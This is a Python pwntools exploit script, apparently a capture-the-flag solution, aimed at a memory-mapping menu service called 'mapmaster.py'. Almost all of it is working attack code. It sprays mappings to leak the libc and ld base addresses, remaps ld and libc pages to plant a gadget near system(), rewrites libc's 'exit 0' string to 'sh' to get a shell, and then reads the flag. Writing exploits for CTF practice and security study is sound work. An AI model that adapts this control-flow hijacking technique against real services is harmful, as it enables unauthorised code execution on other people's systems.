#!/usr/bin/env python3
"""
file: pwn_template.py
author: Fabio Zoratti @orsobruno96 <fabio.zoratti96@gmail.com>

"""
from os import system
from pathlib import Path

from pwn import (
    ELF, context, args, gdb, remote, process, log,
    fit, ROP, p64, u64, p32, u32, flat, cyclic, shellcraft, asm, ui,
    disasm,
)
from itertools import pairwise


elf_name = "/usr/bin/python3"
MASK64 = (1 << 64) - 1

gdbscript = """
continue
"""
exe = context.binary = ELF(elf_name)
remotehost = ("localhost", 10003)
# remotehost = ("10.90.119.120", 6000)
libc = ELF("libc.so")
ld = ELF("ld.so")


def start(argv=[], *a, **kw):
    SCRIPTNAME = "gdbscript.txt"
    with open(SCRIPTNAME, "w") as outfile:
        outfile.write(gdbscript)
    if args.GDB:
        io = process([exe.path, "mapmaster.py"] + argv, *a, **kw)
        system(f"tmux rename-window {elf_name[:8]}")
        system(f"tmux split-window -h -f -c . sh -c 'gdb -p {io.pid} -x {SCRIPTNAME} && fish'")
        return io
    if args.REMOTE:
        return remote(*remotehost, *a, **kw)
    return process([exe.path, "mapmaster.py"] + argv, *a, **kw)


def menu(io, choice: int):
    io.sendlineafter(b"menu>", f"{choice}".encode())


def do_map(io, addr: int, size: int, content: bytes):
    menu(io, 1)
    io.sendlineafter(b"addr:", f"{addr:#x}".encode())
    io.sendlineafter(b"size:", f"{size:#x}".encode())
    io.sendlineafter(b"buf:", content.hex().encode())
    return int(io.recvline(False), 0)


def cat_procmappings(io):
    """This exists only for debugging purposes
    and is removed in production
    """
    menu(io, 3)
    io.sendlineafter(b"addr:", b"0")
    io.sendlineafter(b"size:", b"0")
    content = io.recvuntil(b"[vsyscall]").decode()

    print(content)
    addresses = {}
    for entry in ["libc.so.6", "ld-linux-x86"]:
        for line in content.splitlines():
            if entry in line:
                addr = int(line.split("-")[0], 16)
                addresses[entry] = addr
                print(f"{entry} address: {addr:#x}")
                break
    return addresses


def do_unmap(io, addr: int, size: int):
    menu(io, 2)
    io.sendlineafter(b"addr:", f"{addr:#x}".encode())
    io.sendlineafter(b"size:", f"{size:#x}".encode())
    return int(io.recvline(False), 0)


def leak_libc_spray_2(io):
    first = do_map(io, 0, 0x1000, b"/bin/sh\x00")
    log.info(f"First map {first = :#x}")
    bigmap = do_map(io, 0, 0x20000, b"/bin/sh\x00")
    addresses = [(first, 0x1000), (bigmap, 0x20000)]

    for pn in range(0x80):
        result = do_map(io, (req := first + pn*0x1000), 0x1000, b"/bin/sh\x00")
        if result != req:
            log.info(f"Obtained a different mapping {req = :#x} {result = :#x}")
        addresses.append((result, 0x1000))

    addresses.sort()
    first = addresses[0][0]

    ranges = []
    for i, (pa1, pa2) in enumerate(pairwise(addresses)):
        a1, s1 = pa1
        a2, s2 = pa2
        if i != len(addresses) - 2 and a2 == (end := a1 + s1):
            continue
        ranges.append((first, end))
        first = a2

    for r in ranges:
        print(f"{r[0]:#x} - {r[1]:#x} (size: {r[1] - r[0]:#x})")

    if len(ranges) in [4]:
        ld.address = ranges[-1][0] - 0x3c000
        libc.address = ranges[0][1] + 0x315000

        log.success(f"Leaked {ld.address = :#018x}")
        log.success(f"Leaked {libc.address = :#018x}")
    else:
        log.error("Strange mapping ranges")


def overwrite_magic(io, real_addresses):
    leak_libc_spray_2(io)
    if real_addresses:
        for binary, entry in zip([ld, libc], ["ld-linux-x86", "libc.so.6"]):
            if binary.address != real_addresses[entry]:
                log.warn(f"{ld.address = :#x} != {real_addresses[entry] = :#x}")


    magic_gadget = libc.sym['system'] + 0x10
    exit0_str = next(libc.search(b"exit 0"))

    ld_rtld_global_page = ld.sym['_rtld_global'] & (MASK64 << 12)
    ld___rtld_mutex_lock_page = ld.address + 0x39000

    with open("rtld_mutex_lock_page.bin", 'rb') as f:
        original_rtld_mutex_lock_page = f.read()[:0x1000]
    new_rtld_mutex_lock_page = original_rtld_mutex_lock_page[:0xa80] + p64(magic_gadget) + original_rtld_mutex_lock_page[0xa80:]
    do_unmap(io, ld___rtld_mutex_lock_page, 0x1000)
    do_map(io, ld___rtld_mutex_lock_page, 0x1000, flat(
        # 0xa80 * b'\x',
        # p64(magic_gadget)
        new_rtld_mutex_lock_page
    ))

    exit0_page = exit0_str & (MASK64 << 12)
    # get original data from the libc
    original_page = libc.read(exit0_page, 0x1000)

    exit0str_off = exit0_str & 0xfff
    filler = b"sh\x00"
    new_page = original_page[:exit0str_off] + filler + original_page[exit0str_off + len(filler):]

    do_unmap(io, exit0_page, 0x1000)
    do_map(io, exit0_page, 0x1000, new_page)
    menu(io, 1)
    io.sendlineafter(b"addr:", b"palle")


def main():

    io = start()
    if not args.REMOTE:
        ui.pause()

    real_addresses = cat_procmappings(io) if args.PALLE else {}

    overwrite_magic(io, real_addresses)
    io.sendlineafter(b"'palle'", b"cat flag*")
    io.interactive()


if __name__ == "__main__":
    main()
